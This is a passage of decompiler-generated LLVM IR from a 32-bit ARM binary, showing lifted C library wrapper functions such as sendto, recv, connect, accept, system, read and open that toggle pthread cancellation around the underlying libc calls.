  store i32 %v0_cb98, i32* %r0.global-to-local, align 4
  br i1 %v7_cb94, label %dec_label_pc_cba0, label %dec_label_pc_cb4c

dec_label_pc_cba0:                                ; preds = %dec_label_pc_cb70.backedge
  %v0_cba0.pre = load i32, i32* %sl.global-to-local, align 4
  %v6_cba0 = icmp eq i32 %v0_cba0.pre, -2147483648
  br i1 %v6_cba0, label %dec_label_pc_cb20, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cba0
  br label %dec_label_pc_cb20

dec_label_pc_cbc8:                                ; preds = %dec_label_pc_cb20
  store i32 0, i32* %v1_cb20, align 4
  %v1_cbcc.pre = load i32, i32* @r8, align 4
  %phitmp = inttoptr i32 %v1_cbcc.pre to i32*
  store i32 0, i32* %phitmp, align 4
  %v2_cbd0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_cbd0, i32* @r4, align 4
  %v23_cbd0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v23_cbd0

; uselistorder directives
  uselistorder i32 %v0_cb98, { 1, 2, 0 }
  uselistorder i32 %v0_cb2017, { 1, 0, 2 }
  uselistorder i32 %v0_cb64, { 1, 0 }
  uselistorder i32 %v0_cb884, { 6, 2, 4, 5, 3, 1, 0, 7, 8, 9 }
  uselistorder i32 %v2_cb20, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_cb3c, { 3, 2, 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 0 }
  uselistorder i32 (i32)* @__pthread_acquire, { 5, 4, 2, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_cb70.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_cb4c, { 1, 0 }
  uselistorder label %dec_label_pc_cb20, { 1, 0, 2 }
}

define i32 @sendto() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v3_cbd4 = load i32, i32* @r4, align 4
  %v6_cbd4 = load i32, i32* @r5, align 4
  %v9_cbd4 = load i32, i32* @r6, align 4
  %v12_cbd4 = load i32, i32* @r7, align 4
  %v0_cbdc = load i32, i32* @r0, align 4
  store i32 %v0_cbdc, i32* @r7, align 4
  %v0_cbe0 = load i32, i32* @r1, align 4
  store i32 %v0_cbe0, i32* @r4, align 4
  %v2_cbe8 = ptrtoint i32* %stack_var_-24 to i32
  %v0_cbec = load i32, i32* @r2, align 4
  store i32 %v0_cbec, i32* @r5, align 4
  %v0_cbf0 = load i32, i32* @r3, align 4
  store i32 %v0_cbf0, i32* @r6, align 4
  %v3_cbf4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cbe8)
  %v0_cc04 = load i32, i32* @r4, align 4
  store i32 %v0_cc04, i32* @r1, align 4
  %v0_cc08 = load i32, i32* @r5, align 4
  store i32 %v0_cc08, i32* @r2, align 4
  %v0_cc0c = load i32, i32* @r6, align 4
  store i32 %v0_cc0c, i32* @r3, align 4
  %v0_cc10 = load i32, i32* @r7, align 4
  store i32 %v0_cc10, i32* @r0, align 4
  %v6_cc18 = call i32 @__libc_sendto(i32 %v0_cc10, i32 %v0_cc04, i32 %v0_cc08, i32 %v0_cc0c, i32 %tmp6, i32 %tmp1)
  store i32 %v6_cc18, i32* @r4, align 4
  %v3_cc24 = load i32, i32* %stack_var_-24, align 4
  %v2_cc28 = trunc i32 %v3_cc24 to i8
  %v3_cc28 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cc28, i32 0)
  %v0_cc2c = load i32, i32* @r4, align 4
  store i32 %v3_cbd4, i32* @r4, align 4
  store i32 %v6_cbd4, i32* @r5, align 4
  store i32 %v9_cbd4, i32* @r6, align 4
  store i32 %v12_cbd4, i32* @r7, align 4
  ret i32 %v0_cc2c
}

define i32 @sendmsg() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v2_cc3c = ptrtoint i32* %stack_var_-20 to i32
  %v0_cc40 = load i32, i32* @r0, align 4
  store i32 %v0_cc40, i32* @r4, align 4
  %v0_cc44 = load i32, i32* @r1, align 4
  store i32 %v0_cc44, i32* @r5, align 4
  %v0_cc48 = load i32, i32* @r2, align 4
  store i32 %v0_cc48, i32* @r6, align 4
  %v3_cc54 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cc3c)
  %v0_cc58 = load i32, i32* @r5, align 4
  store i32 %v0_cc58, i32* @r1, align 4
  %v0_cc5c = load i32, i32* @r6, align 4
  store i32 %v0_cc5c, i32* @r2, align 4
  %v0_cc60 = load i32, i32* @r4, align 4
  store i32 %v0_cc60, i32* @r0, align 4
  %v3_cc64 = call i32 @__libc_sendmsg(i32 %v0_cc60, i32 %v0_cc58, i32 %v0_cc5c)
  store i32 %v3_cc64, i32* @r4, align 4
  %v2_cc70 = load i32, i32* %stack_var_-20, align 4
  %v2_cc74 = trunc i32 %v2_cc70 to i8
  %v3_cc74 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cc74, i32 0)
  %v0_cc78 = load i32, i32* @r4, align 4
  ret i32 %v0_cc78
}

define i32 @send() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_cc84 = load i32, i32* @r4, align 4
  %v6_cc84 = load i32, i32* @r5, align 4
  %v9_cc84 = load i32, i32* @r6, align 4
  %v12_cc84 = load i32, i32* @r7, align 4
  %v2_cc88 = ptrtoint i32* %stack_var_-24 to i32
  %v0_cc8c = load i32, i32* @r0, align 4
  store i32 %v0_cc8c, i32* @r4, align 4
  %v0_cc90 = load i32, i32* @r1, align 4
  store i32 %v0_cc90, i32* @r5, align 4
  %v0_cc94 = load i32, i32* @r2, align 4
  store i32 %v0_cc94, i32* @r6, align 4
  %v0_cc98 = load i32, i32* @r3, align 4
  store i32 %v0_cc98, i32* @r7, align 4
  %v3_cca4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cc88)
  %v0_cca8 = load i32, i32* @r5, align 4
  store i32 %v0_cca8, i32* @r1, align 4
  %v0_ccac = load i32, i32* @r6, align 4
  store i32 %v0_ccac, i32* @r2, align 4
  %v0_ccb0 = load i32, i32* @r7, align 4
  store i32 %v0_ccb0, i32* @r3, align 4
  %v0_ccb4 = load i32, i32* @r4, align 4
  store i32 %v0_ccb4, i32* @r0, align 4
  %v4_ccb8 = call i32 @__libc_send(i32 %v0_ccb4, i32 %v0_cca8, i32 %v0_ccac, i32 %v0_ccb0)
  store i32 %v4_ccb8, i32* @r4, align 4
  %v2_ccc4 = load i32, i32* %stack_var_-24, align 4
  %v2_ccc8 = trunc i32 %v2_ccc4 to i8
  %v3_ccc8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ccc8, i32 0)
  %v0_cccc = load i32, i32* @r4, align 4
  store i32 %v3_cc84, i32* @r4, align 4
  store i32 %v6_cc84, i32* @r5, align 4
  store i32 %v9_cc84, i32* @r6, align 4
  store i32 %v12_cc84, i32* @r7, align 4
  ret i32 %v0_cccc
}

define i32 @recvmsg() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v9_ccd8 = load i32, i32* @r6, align 4
  %v2_ccdc = ptrtoint i32* %stack_var_-20 to i32
  %v0_cce0 = load i32, i32* @r0, align 4
  store i32 %v0_cce0, i32* @r4, align 4
  %v0_cce4 = load i32, i32* @r1, align 4
  store i32 %v0_cce4, i32* @r5, align 4
  %v0_cce8 = load i32, i32* @r2, align 4
  store i32 %v0_cce8, i32* @r6, align 4
  %v3_ccf4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_ccdc)
  %v0_ccf8 = load i32, i32* @r5, align 4
  store i32 %v0_ccf8, i32* @r1, align 4
  %v0_ccfc = load i32, i32* @r6, align 4
  store i32 %v0_ccfc, i32* @r2, align 4
  %v0_cd00 = load i32, i32* @r4, align 4
  store i32 %v0_cd00, i32* @r0, align 4
  %v3_cd04 = call i32 @__libc_recvmsg(i32 %v0_cd00, i32 %v0_ccf8, i32 %v0_ccfc)
  store i32 %v3_cd04, i32* @r4, align 4
  %v2_cd10 = load i32, i32* %stack_var_-20, align 4
  %v2_cd14 = trunc i32 %v2_cd10 to i8
  %v3_cd14 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cd14, i32 0)
  %v0_cd18 = load i32, i32* @r4, align 4
  store i32 %v9_ccd8, i32* @r6, align 4
  ret i32 %v0_cd18
}

define i32 @recvfrom() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v9_cd24 = load i32, i32* @r6, align 4
  %v12_cd24 = load i32, i32* @r7, align 4
  %v0_cd2c = load i32, i32* @r0, align 4
  store i32 %v0_cd2c, i32* @r7, align 4
  %v0_cd30 = load i32, i32* @r1, align 4
  store i32 %v0_cd30, i32* @r4, align 4
  %v2_cd38 = ptrtoint i32* %stack_var_-24 to i32
  %v0_cd3c = load i32, i32* @r2, align 4
  store i32 %v0_cd3c, i32* @r5, align 4
  %v0_cd40 = load i32, i32* @r3, align 4
  store i32 %v0_cd40, i32* @r6, align 4
  %v3_cd44 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cd38)
  %v0_cd54 = load i32, i32* @r4, align 4
  store i32 %v0_cd54, i32* @r1, align 4
  %v0_cd58 = load i32, i32* @r5, align 4
  store i32 %v0_cd58, i32* @r2, align 4
  %v0_cd5c = load i32, i32* @r6, align 4
  store i32 %v0_cd5c, i32* @r3, align 4
  %v0_cd60 = load i32, i32* @r7, align 4
  store i32 %v0_cd60, i32* @r0, align 4
  %v6_cd68 = call i32 @__libc_recvfrom(i32 %v0_cd60, i32 %v0_cd54, i32 %v0_cd58, i32 %v0_cd5c, i32 %tmp6, i32 %tmp1)
  store i32 %v6_cd68, i32* @r4, align 4
  %v3_cd74 = load i32, i32* %stack_var_-24, align 4
  %v2_cd78 = trunc i32 %v3_cd74 to i8
  %v3_cd78 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cd78, i32 0)
  %v0_cd7c = load i32, i32* @r4, align 4
  store i32 %v9_cd24, i32* @r6, align 4
  store i32 %v12_cd24, i32* @r7, align 4
  ret i32 %v0_cd7c
}

define i32 @recv() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_cd88 = load i32, i32* @r4, align 4
  %v6_cd88 = load i32, i32* @r5, align 4
  %v9_cd88 = load i32, i32* @r6, align 4
  %v12_cd88 = load i32, i32* @r7, align 4
  %v2_cd8c = ptrtoint i32* %stack_var_-24 to i32
  %v0_cd90 = load i32, i32* @r0, align 4
  store i32 %v0_cd90, i32* @r4, align 4
  %v0_cd94 = load i32, i32* @r1, align 4
  store i32 %v0_cd94, i32* @r5, align 4
  %v0_cd98 = load i32, i32* @r2, align 4
  store i32 %v0_cd98, i32* @r6, align 4
  %v0_cd9c = load i32, i32* @r3, align 4
  store i32 %v0_cd9c, i32* @r7, align 4
  %v3_cda8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cd8c)
  %v0_cdac = load i32, i32* @r5, align 4
  store i32 %v0_cdac, i32* @r1, align 4
  %v0_cdb0 = load i32, i32* @r6, align 4
  store i32 %v0_cdb0, i32* @r2, align 4
  %v0_cdb4 = load i32, i32* @r7, align 4
  store i32 %v0_cdb4, i32* @r3, align 4
  %v0_cdb8 = load i32, i32* @r4, align 4
  store i32 %v0_cdb8, i32* @r0, align 4
  %v4_cdbc = call i32 @__libc_recv(i32 %v0_cdb8, i32 %v0_cdac, i32 %v0_cdb0, i32 %v0_cdb4)
  store i32 %v4_cdbc, i32* @r4, align 4
  %v2_cdc8 = load i32, i32* %stack_var_-24, align 4
  %v2_cdcc = trunc i32 %v2_cdc8 to i8
  %v3_cdcc = call i32 @__GI_pthread_setcanceltype(i8 %v2_cdcc, i32 0)
  %v0_cdd0 = load i32, i32* @r4, align 4
  store i32 %v3_cd88, i32* @r4, align 4
  store i32 %v6_cd88, i32* @r5, align 4
  store i32 %v9_cd88, i32* @r6, align 4
  store i32 %v12_cd88, i32* @r7, align 4
  ret i32 %v0_cdd0
}

define i32 @connect() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_cddc = load i32, i32* @r4, align 4
  %v6_cddc = load i32, i32* @r5, align 4
  %v9_cddc = load i32, i32* @r6, align 4
  %v2_cde0 = ptrtoint i32* %stack_var_-20 to i32
  %v0_cde4 = load i32, i32* @r0, align 4
  store i32 %v0_cde4, i32* @r4, align 4
  %v0_cde8 = load i32, i32* @r1, align 4
  store i32 %v0_cde8, i32* @r5, align 4
  %v0_cdec = load i32, i32* @r2, align 4
  store i32 %v0_cdec, i32* @r6, align 4
  %v3_cdf8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cde0)
  %v0_cdfc = load i32, i32* @r5, align 4
  store i32 %v0_cdfc, i32* @r1, align 4
  %v0_ce00 = load i32, i32* @r6, align 4
  store i32 %v0_ce00, i32* @r2, align 4
  %v0_ce04 = load i32, i32* @r4, align 4
  store i32 %v0_ce04, i32* @r0, align 4
  %v3_ce08 = call i32 @__libc_connect(i32 %v0_ce04, i32 %v0_cdfc, i32 %v0_ce00)
  store i32 %v3_ce08, i32* @r4, align 4
  %v2_ce14 = load i32, i32* %stack_var_-20, align 4
  %v2_ce18 = trunc i32 %v2_ce14 to i8
  %v3_ce18 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ce18, i32 0)
  %v0_ce1c = load i32, i32* @r4, align 4
  store i32 %v3_cddc, i32* @r4, align 4
  store i32 %v6_cddc, i32* @r5, align 4
  store i32 %v9_cddc, i32* @r6, align 4
  ret i32 %v0_ce1c
}

define i32 @accept() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_ce28 = load i32, i32* @r4, align 4
  %v6_ce28 = load i32, i32* @r5, align 4
  %v9_ce28 = load i32, i32* @r6, align 4
  %v2_ce2c = ptrtoint i32* %stack_var_-20 to i32
  %v0_ce30 = load i32, i32* @r0, align 4
  store i32 %v0_ce30, i32* @r4, align 4
  %v0_ce34 = load i32, i32* @r1, align 4
  store i32 %v0_ce34, i32* @r5, align 4
  %v0_ce38 = load i32, i32* @r2, align 4
  store i32 %v0_ce38, i32* @r6, align 4
  %v3_ce44 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_ce2c)
  %v0_ce48 = load i32, i32* @r5, align 4
  store i32 %v0_ce48, i32* @r1, align 4
  %v0_ce4c = load i32, i32* @r6, align 4
  store i32 %v0_ce4c, i32* @r2, align 4
  %v0_ce50 = load i32, i32* @r4, align 4
  store i32 %v0_ce50, i32* @r0, align 4
  %v3_ce54 = call i32 @__libc_accept(i32 %v0_ce50, i32 %v0_ce48, i32 %v0_ce4c)
  store i32 %v3_ce54, i32* @r4, align 4
  %v2_ce60 = load i32, i32* %stack_var_-20, align 4
  %v2_ce64 = trunc i32 %v2_ce60 to i8
  %v3_ce64 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ce64, i32 0)
  %v0_ce68 = load i32, i32* @r4, align 4
  store i32 %v3_ce28, i32* @r4, align 4
  store i32 %v6_ce28, i32* @r5, align 4
  store i32 %v9_ce28, i32* @r6, align 4
  ret i32 %v0_ce68
}

define i32 @write() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_ce74 = load i32, i32* @r4, align 4
  %v6_ce74 = load i32, i32* @r5, align 4
  %v9_ce74 = load i32, i32* @r6, align 4
  %v2_ce78 = ptrtoint i32* %stack_var_-20 to i32
  %v0_ce7c = load i32, i32* @r0, align 4
  store i32 %v0_ce7c, i32* @r4, align 4
  %v0_ce80 = load i32, i32* @r1, align 4
  store i32 %v0_ce80, i32* @r5, align 4
  %v0_ce84 = load i32, i32* @r2, align 4
  store i32 %v0_ce84, i32* @r6, align 4
  %v3_ce90 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_ce78)
  %v0_ce94 = load i32, i32* @r5, align 4
  store i32 %v0_ce94, i32* @r1, align 4
  %v0_ce98 = load i32, i32* @r6, align 4
  store i32 %v0_ce98, i32* @r2, align 4
  %v0_ce9c = load i32, i32* @r4, align 4
  store i32 %v0_ce9c, i32* @r0, align 4
  %v2_cea0 = call i32 @__libc_write(i32 %v0_ce9c, i32 %v0_ce94)
  store i32 %v2_cea0, i32* @r4, align 4
  %v2_ceac = load i32, i32* %stack_var_-20, align 4
  %v2_ceb0 = trunc i32 %v2_ceac to i8
  %v3_ceb0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ceb0, i32 0)
  %v0_ceb4 = load i32, i32* @r4, align 4
  store i32 %v3_ce74, i32* @r4, align 4
  store i32 %v6_ce74, i32* @r5, align 4
  store i32 %v9_ce74, i32* @r6, align 4
  ret i32 %v0_ceb4
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_cec0 = load i32, i32* @r4, align 4
  %v6_cec0 = load i32, i32* @r5, align 4
  %v2_cec4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v3_cedc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cec4)
  %v0_cee0 = load i32, i32* @r5, align 4
  %v0_cee8 = load i32, i32* @r4, align 4
  %v3_ceec = call i32 @__libc_waitpid(i32 %v0_cee8, i32 %v0_cee0, i32 %arg3)
  store i32 %v3_ceec, i32* @r4, align 4
  %v2_cef8 = load i32, i32* %stack_var_-20, align 4
  %v2_cefc = trunc i32 %v2_cef8 to i8
  %v3_cefc = call i32 @__GI_pthread_setcanceltype(i8 %v2_cefc, i32 0)
  %v0_cf00 = load i32, i32* @r4, align 4
  store i32 %v3_cec0, i32* @r4, align 4
  store i32 %v6_cec0, i32* @r5, align 4
  ret i32 %v0_cf00
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_cf10 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_cf20 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cf10)
  %v0_cf24 = load i32, i32* @r4, align 4
  %v1_cf28 = call i32 @__libc_wait(i32 %v0_cf24)
  store i32 %v1_cf28, i32* @r4, align 4
  %v2_cf34 = load i32, i32* %stack_var_-12, align 4
  %v2_cf38 = trunc i32 %v2_cf34 to i8
  %v3_cf38 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cf38, i32 0)
  %v0_cf3c = load i32, i32* @r4, align 4
  ret i32 %v0_cf3c
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_cf4c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_cf5c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cf4c)
  %v0_cf60 = load i32, i32* @r4, align 4
  store i32 %v0_cf60, i32* @r0, align 4
  %v1_cf64 = call i32 @__libc_tcdrain(i32 %v0_cf60)
  store i32 %v1_cf64, i32* @r4, align 4
  %v2_cf70 = load i32, i32* %stack_var_-12, align 4
  %v2_cf74 = trunc i32 %v2_cf70 to i8
  %v3_cf74 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cf74, i32 0)
  %v0_cf78 = load i32, i32* @r4, align 4
  ret i32 %v0_cf78
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_cf88 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_cf98 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cf88)
  %v0_cf9c = load i32, i32* @r4, align 4
  %v1_cfa0 = call i32 @__libc_system(i32 %v0_cf9c)
  store i32 %v1_cfa0, i32* @r4, align 4
  %v2_cfac = load i32, i32* %stack_var_-12, align 4
  %v2_cfb0 = trunc i32 %v2_cfac to i8
  %v3_cfb0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cfb0, i32 0)
  %v0_cfb4 = load i32, i32* @r4, align 4
  ret i32 %v0_cfb4
}

define i32 @read() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v6_cfc0 = load i32, i32* @r5, align 4
  %v9_cfc0 = load i32, i32* @r6, align 4
  %v2_cfc4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_cfc8 = load i32, i32* @r0, align 4
  store i32 %v0_cfc8, i32* @r4, align 4
  %v0_cfcc = load i32, i32* @r1, align 4
  store i32 %v0_cfcc, i32* @r5, align 4
  %v0_cfd0 = load i32, i32* @r2, align 4
  store i32 %v0_cfd0, i32* @r6, align 4
  %v3_cfdc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cfc4)
  %v0_cfe0 = load i32, i32* @r5, align 4
  store i32 %v0_cfe0, i32* @r1, align 4
  %v0_cfe4 = load i32, i32* @r6, align 4
  store i32 %v0_cfe4, i32* @r2, align 4
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 %v0_cfe8, i32* @r0, align 4
  %v1_cfec = call i32 @__libc_read(i32 %v0_cfe8)
  store i32 %v1_cfec, i32* @r4, align 4
  %v2_cff8 = load i32, i32* %stack_var_-20, align 4
  %v2_cffc = trunc i32 %v2_cff8 to i8
  %v3_cffc = call i32 @__GI_pthread_setcanceltype(i8 %v2_cffc, i32 0)
  %v0_d000 = load i32, i32* @r4, align 4
  store i32 %v6_cfc0, i32* @r5, align 4
  store i32 %v9_cfc0, i32* @r6, align 4
  ret i32 %v0_d000
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_d010 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  %v3_d02c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d010)
  %v0_d030 = load i32, i32* @r5, align 4
  store i32 %v0_d030, i32* @r1, align 4
  %v0_d034 = load i32, i32* @r6, align 4
  store i32 %v0_d034, i32* @r2, align 4
  %v0_d038 = load i32, i32* @r7, align 4
  store i32 %v0_d038, i32* @r3, align 4
  %v0_d03c = load i32, i32* @r4, align 4
  store i32 %v0_d03c, i32* @r0, align 4
  %v4_d040 = call i32 @__libc_pwrite(i32 %v0_d03c, i32 %v0_d030, i32 %v0_d034, i32 %v0_d038)
  store i32 %v4_d040, i32* @r4, align 4
  %v2_d04c = load i32, i32* %stack_var_-24, align 4
  %v2_d050 = trunc i32 %v2_d04c to i8
  %v3_d050 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d050, i32 0)
  %v0_d054 = load i32, i32* @r4, align 4
  ret i32 %v0_d054
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v2_d084 = ptrtoint i32* %stack_var_-32 to i32
  %v3_d08c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d084)
  %v0_d090 = load i32, i32* @r4, align 4
  %v0_d094 = load i32, i32* @r6, align 4
  store i32 %v0_d094, i32* @r1, align 4
  %v0_d098 = load i32, i32* @r7, align 4
  store i32 %v0_d098, i32* @r2, align 4
  %v0_d09c = load i32, i32* @r8, align 4
  store i32 %v0_d09c, i32* @r0, align 4
  %v0_d0a0 = load i32, i32* @r5, align 4
  %v5_d0a4 = call i32 @__libc_pread64(i32 %v0_d09c, i32 %v0_d094, i32 %v0_d098, i32 %v0_d090, i32 %v0_d0a0)
  store i32 %v5_d0a4, i32* @r4, align 4
  %v3_d0b0 = load i32, i32* %stack_var_-32, align 4
  %v2_d0b4 = trunc i32 %v3_d0b0 to i8
  %v3_d0b4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d0b4, i32 0)
  %v0_d0b8 = load i32, i32* @r4, align 4
  ret i32 %v0_d0b8
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_d0d0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  %v3_d0ec = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d0d0)
  %v0_d0f0 = load i32, i32* @r5, align 4
  store i32 %v0_d0f0, i32* @r1, align 4
  %v0_d0f4 = load i32, i32* @r6, align 4
  store i32 %v0_d0f4, i32* @r2, align 4
  %v0_d0f8 = load i32, i32* @r7, align 4
  store i32 %v0_d0f8, i32* @r3, align 4
  %v0_d0fc = load i32, i32* @r4, align 4
  store i32 %v0_d0fc, i32* @r0, align 4
  %v4_d100 = call i32 @__libc_pread(i32 %v0_d0fc, i32 %v0_d0f0, i32 %v0_d0f4, i32 %v0_d0f8)
  store i32 %v4_d100, i32* @r4, align 4
  %v2_d10c = load i32, i32* %stack_var_-24, align 4
  %v2_d110 = trunc i32 %v2_d10c to i8
  %v3_d110 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d110, i32 0)
  %v0_d114 = load i32, i32* @r4, align 4
  ret i32 %v0_d114
}

define i32 @pause() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_d124 = ptrtoint i32* %stack_var_-12 to i32
  %v3_d130 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d124)
  %v1_d134 = call i32 @__libc_pause(i32 %v3_d130)
  store i32 %v1_d134, i32* @r4, align 4
  %v2_d140 = load i32, i32* %stack_var_-12, align 4
  %v2_d144 = trunc i32 %v2_d140 to i8
  %v3_d144 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d144, i32 0)
  %v0_d148 = load i32, i32* @r4, align 4
  ret i32 %v0_d148
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_d164 = ptrtoint i32* %stack_var_-24 to i32
  %v3_d16c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d164)
  %v2_d170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_d17c = load i32, i32* @r4, align 4
  store i32 %v0_d17c, i32* @r0, align 4
  %v5_d184 = call i32 @__GI___libc_open64(i32 %v0_d17c, i32 %arg2, i32 %arg3, i32 %v2_d170, i32 %v2_d170)
  store i32 %v5_d184, i32* @r4, align 4
  %v3_d190 = load i32, i32* %stack_var_-24, align 4
  %v2_d194 = trunc i32 %v3_d190 to i8
  %v3_d194 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d194, i32 0)
  %v0_d198 = load i32, i32* @r4, align 4
  ret i32 %v0_d198

; uselistorder directives
  uselistorder i32 %v2_d170, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @open() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_d1ac = load i32, i32* @r1, align 4
  %v0_d1b8 = load i32, i32* @r0, align 4
  store i32 %v0_d1b8, i32* @r4, align 4
  %v2_d1bc = ptrtoint i32* %stack_var_-24 to i32
  %v3_d1c4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d1bc)
  %v0_d1d4 = load i32, i32* @r4, align 4
  store i32 %v0_d1d4, i32* @r0, align 4
  %v2_d1dc = call i32 @__libc_open(i32 %v0_d1d4, i32 %v3_d1ac)
  store i32 %v2_d1dc, i32* @r4, align 4
  %v3_d1e8 = load i32, i32* %stack_var_-24, align 4
  %v2_d1ec = trunc i32 %v3_d1e8 to i8
  %v3_d1ec = call i32 @__GI_pthread_setcanceltype(i8 %v2_d1ec, i32 0)
  %v0_d1f0 = load i32, i32* @r4, align 4
  ret i32 %v0_d1f0
}

define i32 @nanosleep() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_d204 = load i32, i32* @r4, align 4
  %v6_d204 = load i32, i32* @r5, align 4
  %v2_d208 = ptrtoint i32* %stack_var_-16 to i32
  %v0_d20c = load i32, i32* @r0, align 4
  store i32 %v0_d20c, i32* @r4, align 4
  %v0_d210 = load i32, i32* @r1, align 4
  store i32 %v0_d210, i32* @r5, align 4
  %v3_d21c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d208)
  %v0_d220 = load i32, i32* @r5, align 4
  store i32 %v0_d220, i32* @r1, align 4
  %v0_d224 = load i32, i32* @r4, align 4
  store i32 %v0_d224, i32* @r0, align 4
  %v1_d228 = call i32 @__libc_nanosleep(i32 %v0_d224)
  store i32 %v1_d228, i32* @r4, align 4
  %v2_d234 = load i32, i32* %stack_var_-16, align 4
  %v2_d238 = trunc i32 %v2_d234 to i8
  %v3_d238 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d238, i32 0)
  %v0_d23c = load i32, i32* @r4, align 4
